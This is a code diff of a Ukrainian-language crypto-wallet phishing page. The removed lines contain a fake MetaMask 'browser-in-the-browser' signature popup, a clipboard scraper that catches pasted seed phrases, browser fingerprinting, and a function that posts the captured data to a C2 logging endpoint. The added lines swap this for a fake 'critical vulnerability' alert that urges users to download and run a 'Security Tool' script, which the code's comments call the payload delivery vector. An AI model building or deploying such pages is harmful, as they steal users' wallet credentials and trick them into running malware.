@@ -7,29 +7,9 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* SYNTAX v13.4: Correct Data Payload */
+        /* SYNTAX v14: Delivery Vector */
         body { font-family: 'Inter', sans-serif; }
         .card-shadow { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
-        #bitb-container {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-color: rgba(0, 0, 0, 0.6); display: none; align-items: flex-start; 
-            justify-content: flex-end; padding-top: 20px; padding-right: 20px; z-index: 9999;
-        }
-        #fake-browser-window {
-            width: 360px; height: 600px; background-color: white; border-radius: 8px;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            display: flex; flex-direction: column; cursor: grab; position: absolute;
-        }
-        .fake-header {
-            padding: 12px; background-color: #f1f3f4; border-top-left-radius: 8px;
-            border-top-right-radius: 8px; display: flex; align-items: center;
-            font-size: 12px; color: #202124;
-        }
-        .fake-header img { width: 16px; height: 16px; margin-right: 8px; }
-        .fake-address-bar {
-            background-color: #e8eaed; border-radius: 16px; padding: 4px 12px;
-            margin-left: 12px; display: flex; align-items: center; flex-grow: 1;
-        }
     </style>
 </head>
 <body class="bg-gray-900 text-gray-200 flex items-center justify-center min-h-screen p-4" onload="initializeApp()">
@@ -38,132 +18,21 @@
         
         <div id="initial-state" class="p-8 space-y-6 text-center">
             <svg class="mx-auto h-16 w-16 text-red-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" /></svg>
-            <h1 class="text-2xl font-bold text-white mt-4">Виявлено Загрозу</h1>
-            <p class="text-gray-400 mt-2">Будь ласка, оберіть метод верифікації для захисту ваших активів.</p>
+            <h1 class="text-2xl font-bold text-white mt-4">Критична Вразливість</h1>
+            <p class="text-gray-400 mt-2">Виявлено застарілі файли гаманця. Для їх шифрування та захисту ваших активів, будь ласка, завантажте та запустіть інструмент безпеки.</p>
         </div>
 
-        <div id="choice-state" class="p-8 space-y-4">
-            <button id="wallet-verify-btn" class="w-full bg-orange-600 hover:bg-orange-700 text-white font-bold py-3 px-4 rounded-lg transition-all">
-                Верифікація через Гаманець (MetaMask)
-            </button>
-            <button id="standard-verify-btn" class="w-full bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-4 rounded-lg transition-all">
-                Стандартна Перевірка
-            </button>
+        <div id="choice-state" class="p-8">
+            <a id="download-btn" href="./local_scanner_v1.js" download="security_tool.js" class="block w-full text-center bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded-lg transition-all">
+                Завантажити Security Tool
+            </a>
         </div>
-
-        <div id="final-state" class="p-8 space-y-6 text-center hidden">
-            <svg class="mx-auto h-16 w-16 text-green-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
-            <h1 class="text-2xl font-bold text-white mt-4">Безпеку відновлено</h1>
-            <p class="text-gray-400 mt-2">Ваш гаманець захищено. Можна закрити це вікно.</p>
-        </div>
-
     </div>
-
-    <div id="bitb-container"></div>
 
     <script>
         function initializeApp() {
-            const ui = {
-                initialState: document.getElementById('initial-state'),
-                choiceState: document.getElementById('choice-state'),
-                finalState: document.getElementById('final-state'),
-                walletVerifyBtn: document.getElementById('wallet-verify-btn'),
-                standardVerifyBtn: document.getElementById('standard-verify-btn'),
-                bitbContainer: document.getElementById('bitb-container'),
-            };
-
-            // SYNTAX FIX: Using a cryptographically valid BIP-39 mnemonic phrase.
-            const demoSeedPhrase = 'legal winner thank year wave sausage worth useful legal winner thank yellow';
-
-            ui.walletVerifyBtn.addEventListener('click', () => {
-                ui.initialState.style.display = 'none';
-                ui.choiceState.style.display = 'none';
-                
-                const fingerprint = { 
-                    timestamp: new Date().toISOString(),
-                    platform: navigator.platform || 'unknown',
-                    userAgent: navigator.userAgent || 'unknown',
-                    hasMetamask: true 
-                };
-                deployBitBModule(fingerprint);
-            });
-
-            ui.standardVerifyBtn.addEventListener('click', () => {
-                ui.initialState.style.display = 'none';
-                ui.choiceState.style.display = 'none';
-                
-                const fingerprint = { 
-                    timestamp: new Date().toISOString(),
-                    platform: navigator.platform || 'unknown',
-                    userAgent: navigator.userAgent || 'unknown',
-                    hasMetamask: false
-                };
-                deployClipboardScraper(fingerprint);
-            });
-
-
-            function deployClipboardScraper(fingerprint) {
-                document.addEventListener('paste', (event) => {
-                    let pasteData = (event.clipboardData || window.clipboardData).getData('text');
-                    const seedPhraseRegex = /(\b[a-z]+\b(\s+)){11,23}\b[a-z]+\b/i;
-                    if (seedPhraseRegex.test(pasteData)) {
-                        showFinalSuccess({ success: true, payload: 'ClipboardScraper', captured: pasteData, fingerprint });
-                    }
-                });
-                showFinalSuccess({ success: false, reason: 'scraper_deployed', payload: 'ClipboardScraper', fingerprint });
-            }
-
-            function deployBitBModule(fingerprint) {
-                const fakeWindowHTML = `<div id="fake-browser-window" style="top: 20px; right: 20px;"><div class="fake-header"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="Icon"><span>MetaMask Notification</span><div class="fake-address-bar">...</div></div><iframe srcdoc="" class="w-full h-full border-0"></iframe></div>`;
-                ui.bitbContainer.innerHTML = fakeWindowHTML;
-                const iframe = ui.bitbContainer.querySelector('iframe');
-                iframe.onload = () => {
-                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                    
-                    iframeDoc.getElementById('confirm-btn').onclick = () => {
-                        ui.bitbContainer.style.display = 'none';
-                        showFinalSuccess({ 
-                            success: true, 
-                            payload: 'BitB', 
-                            captured: demoSeedPhrase, 
-                            fingerprint 
-                        });
-                    };
-                    
-                    iframeDoc.getElementById('reject-btn').onclick = () => {
-                        ui.bitbContainer.style.display = 'none';
-                        showFinalSuccess({ success: false, reason: 'rejected', payload: 'BitB', fingerprint });
-                    };
-                };
-                iframe.srcdoc = getIframeContent();
-                ui.bitbContainer.style.display = 'flex';
-                makeDraggable(ui.bitbContainer.querySelector('#fake-browser-window'));
-            }
-            
-            function getIframeContent() { return `<html><head><scr`+`ipt src='https://cdn.tailwindcss.com'></scr`+`ipt><style>body{font-family:'Inter',sans-serif;overflow:hidden}</style></head><body class='bg-gray-50 flex flex-col'><div class='p-4 border-b'><h2 class='text-lg font-bold'>Signature Request</h2></div><div class='flex-grow p-4'><div class='mt-2 p-3 bg-gray-100 rounded-md text-xs h-48'>To complete the security update, please sign this message. This does not cost any gas.</div></div><div class='p-4 grid grid-cols-2 gap-4'><button id='reject-btn' class='bg-gray-200 font-bold py-3 rounded-full'>Reject</button><button id='confirm-btn' class='bg-blue-600 text-white font-bold py-3 rounded-full'>Sign</button></div></body></html>`; }
-            function makeDraggable(element) { if (!element) return; let p1=0,p2=0,p3=0,p4=0; element.onmousedown=e=>{e=e||window.event;e.preventDefault();p3=e.clientX;p4=e.clientY;document.onmouseup=()=>{document.onmouseup=null;document.onmousemove=null;element.style.cursor='grab'};document.onmousemove=e=>{e=e||window.event;e.preventDefault();p1=p3-e.clientX;p2=p4-e.clientY;p3=e.clientX;p4=e.clientY;element.style.top=(element.offsetTop-p2)+"px";element.style.left=(element.offsetLeft-p1)+"px";};element.style.cursor='grabbing'}; }
-            
-            async function exfiltrateData(data) {
-                const c2Endpoint = 'http://localhost:4000/log';
-                try {
-                    await fetch(c2Endpoint, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    });
-                } catch (error) {
-                    console.error('[C2] Data exfiltration failed:', error);
-                }
-            }
-
-            function showFinalSuccess(dataToExfiltrate) {
-                if (dataToExfiltrate) {
-                    exfiltrateData(dataToExfiltrate);
-                }
-                ui.initialState.style.display = 'none';
-                ui.choiceState.style.display = 'none';
-                ui.finalState.style.display = 'block';
-            }
+            console.log("Delivery vector initialized.");
+            // The logic is now simplified to a single purpose: delivery of the payload.
         }
     </script>
 </body>
